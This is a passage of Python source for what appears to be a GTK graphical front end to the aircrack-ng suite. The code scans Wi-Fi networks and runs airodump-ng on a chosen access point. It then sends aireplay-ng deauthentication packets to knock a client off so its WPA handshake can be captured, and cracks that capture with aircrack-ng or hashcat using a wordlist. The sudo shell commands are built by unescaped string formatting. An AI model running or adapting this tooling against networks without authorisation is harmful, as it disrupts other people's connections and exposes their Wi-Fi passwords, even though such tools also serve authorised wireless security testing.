...
def log(string, logtype=0, rewriteable=False):
    ...
    if rewriteable:
        print(
            "["
            + colored(str(dt.now().time()).split(".")[0], "blue")
            + "] ["
            + type_indicator
            + "] "
            + string,
...
def check_monitor_mode(interface):
    command_get_mode = "sudo iwconfig {} | awk -F: '/Mode/{{print$2}}'".format(
        interface
    )
...
# Custom functions ------------------------- Start
# Main window
class Air_gui_window(Gtk.ApplicationWindow):
...
class Scan(Gtk.ApplicationWindow):
    def __init__(self, app):
        ...
        for index, network in enumerate(networks):
            ...
            label = Gtk.Label()
            label.set_markup(
                "<big>BSSID: </big>{}\n<big>Channel: </big>{}\n<big>Signal Strength: </big>{}%\n<big>Encryption: </big>{}".format(
                    network[0], network[2], network[3], network[4]
                )
            )
            vbox.pack_start(label, True, True, 0)

            self.airodumpButton = Gtk.Button(
                label="Start airodump-ng on chosen network"
            )
            self.airodumpButton.connect(
                "pressed", self.on_button_clicked_airodump, "1", network
            )
...
class Airodump_ng(Gtk.ApplicationWindow):
    ...
    def __init__(self, app, network):
        ...
        run_command_background(
            "sudo airodump-ng --bssid {} -c {} --write-interval 1 --write {} {} > /dev/null 2>&1".format(
                self.Network[0], self.Network[2], self.Directory, Interface
            )
        )
        ...
        self.amountOfPacketsEntry.connect(
            "changed", self.on_changed_packet_number_entry
        )
        self.amountOfPacketsEntry.set_placeholder_text(
            "Amount of deauth packets you want to send. 10 by default."
        )
    ...
    def on_station_manual_entry(self, entry):
        ...
        if re.match(
            "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", self.Station.lower()
        ):
    ...
    def run_aireplay(self, button):
        log(
            "Sending {} packets to {}".format(self.DeauthPackets, self.Station), 0, True
        )
        run_command(
            "sudo aireplay-ng --deauth '{}' -a '{}' -c '{}' {}".format(
                self.DeauthPackets, self.Network[0], self.Station, Interface
            )
        )

        hanshakes = 0
        try:
            command_aircrack_output = run_command(
                "sudo aircrack-ng {}-01.cap | sed -n '7p' | tr -s ' ' | tr -d '()\n'".format(
                    self.Directory
                )
            )
            ...
            command_aircrack_output = run_command(
                "sudo aircrack-ng {}-01.cap | sed -n '6p' | tr -s ' ' | tr -d '()\n'".format(
                    self.Directory
                )
            )
            hanshakes = int(command_aircrack_output.split(" ")[5])
        ...
        if hanshakes > 0:
            ...
            log(
                "Sending {} packets to {}: {}".format(
                    self.DeauthPackets, self.Station, colored("Success", "green")
                )
            )
        else:
            self.statusbar.push(
                self.context_id,
                "Failed, handshake not found. Try again or change the target.",
            )
            log(
                "Sending {} packets to {}: {}".format(
                    self.DeauthPackets, self.Station, colored("Failure", "yellow")
                )
            )
    ...
    def manage_temporary_files(self):
        ...
        for _file in os.listdir(self.Directory):
            if (
                os.path.splitext(_file)[1] == ".csv"
                or os.path.splitext(_file)[1] == ".netxml"
            ):
...
class Aircrack_ng(Gtk.ApplicationWindow):
    ...
    def __init__(self, app):
        ...
        self.chooseWordlistFilePath = Gtk.Button(
            label="   Choose wordlist    "
        )  # yeah i know but im too sleepy
        self.chooseWordlistFilePath.connect(
            "pressed", self.choose_wordlist_filepath, "1"
        )
    ...
    def start_hashcat(self, button, name):
        ...
        if extension == "cap":
            run_command(
                "hcxpcapngtool {} -o {}.22000".format(self.capFilePath, filename)
            )
            run_command_background(
                '''xterm -T "hashcat" -hold -e "sudo hashcat -m 22000 '{}' '{}'"'''.format(
                    filename + ".22000", self.wordlistFilePath
                )
            )

    def start_aircrack(self, button, name):
        run_command_background(
            '''xterm -T "aircrack-ng" -hold -e "sudo aircrack-ng -w '{}' '{}'"'''.format(
                self.wordlistFilePath, self.capFilePath
            )
        )
    ...
    def choose_cap_filepath(self, button, name):
        chooser = Gtk.FileChooserDialog(
            title="Open dot File", action=Gtk.FileChooserAction.OPEN
        )
...
class NoInterfacesFoundDialog(Gtk.MessageDialog):
    def __init__(self):
        Gtk.Dialog.__init__(
            self, transient_for=None, flags=0, text="Interfaces not found"
        )
...
class MonitorModeEnabledDialog(Gtk.MessageDialog):
    def __init__(self):
        Gtk.Dialog.__init__(
            self, transient_for=None, flags=0, text="Monitor mode is enabled"
        )
        self.set_default_size(150, 100)
        ...
        self.format_secondary_text(
            "Interface needs to be in managed mode to be able to scan for intefaces.\nWant to disable monitor mode?"
        )
...
Air_Gui_Window = type(Air_gui_window)


# Programm main body
class Air_gui(Gtk.Application):
    ...
    def do_activate(self):
        global Air_Gui_Window
        Air_Gui_Window = Air_gui_window(self)
    ...
    def do_command_line(self, command_line):
        ...
        global DO_NOT_KILL
        DO_NOT_KILL = (
            True if "nokill" in options and options["nokill"] is True else False
        )  # evil laughing intensifies
        global DO_NOT_LOG
        DO_NOT_LOG = (
            True if "nolog" in options and options["nolog"] is True else False
        )  # ahahaha
        global DO_NOT_CLEAN
        DO_NOT_CLEAN = (
            True if "noclean" in options and options["noclean"] is True else False
        )  # AHAHAHAHAA
